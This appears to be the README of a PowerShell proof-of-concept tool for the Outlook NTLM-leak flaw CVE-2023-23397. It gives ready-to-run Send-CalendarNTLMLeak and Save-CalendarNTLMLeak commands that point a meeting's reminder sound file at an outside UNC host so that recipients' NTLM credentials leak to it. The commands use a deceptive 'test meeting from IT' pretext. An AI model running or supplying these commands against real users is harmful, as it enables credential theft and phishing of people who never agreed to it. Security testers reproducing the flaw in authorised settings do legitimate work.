# CVE-2023-23397-POC-Powershell
Script functions to either send or save calendar NTLM leakage using the ReminderSoundFile option.
Run script to load the functions in Powershell, then you can use the examples below as a starting point for using the functions.
Requires to be run on a Windows machine with Outlook installed since it uses the Outlook COM object to send emails.
Note that it will send the email from the email account associated with Outlook. The current functions will add the meeting start time as of when the script is execute and set it to last 2 hours. 


Sending:
```
Send-CalendarNTLMLeak -recipient "user.name@exampledomain.com" -remotefilepath "\\10.10.10.10\notexists\file.wav" -meetingsubject "Test Meeting" -meetingbody "Just a test meeting from IT, can be deleted"
Send-CalendarNTLMLeak -recipient "user.name@exampledomain.com" -remotefilepath "\\files.domain.com\notexists\file.wav" -meetingsubject "Test Meeting" -meetingbody "Just a test meeting from IT, can be deleted"
Send-CalendarNTLMLeak -recipient "user.name@exampledomain.com" -remotefilepath "\\files.domain.com@80\notexists\file.wav" -meetingsubject "Test Meeting" -meetingbody "Just a test meeting from IT, can be deleted"
Send-CalendarNTLMLeak -recipient "user.name@exampledomain.com" -remotefilepath "\\files.domain.com@SSL@443\notexists\file.wav" -meetingsubject "Test Meeting" -meetingbody "Just a test meeting from IT, can be deleted"
```

Saving:
```
Save-CalendarNTLMLeak -remotefilepath "\\10.10.10.10\notexists\file.wav" -meetingsubject "Test Meeting" -meetingbody "Just a test meeting from IT, can be deleted"
Save-CalendarNTLMLeak -remotefilepath "\\files.domain.com\notexists\file.wav" -meetingsubject "Test Meeting" -meetingbody "Just a test meeting from IT, can be deleted"
Save-CalendarNTLMLeak -remotefilepath "\\files.domain.com@80\file.wav" -meetingsubject "Test Meeting" -meetingbody "Just a test meeting from IT, can be deleted"
Save-CalendarNTLMLeak -remotefilepath "\\files.domain.com@SSL@443\file.wav" -meetingsubject "Test Meeting" -meetingbody "Just a test meeting from IT, can be deleted"
```

Hack the Planet!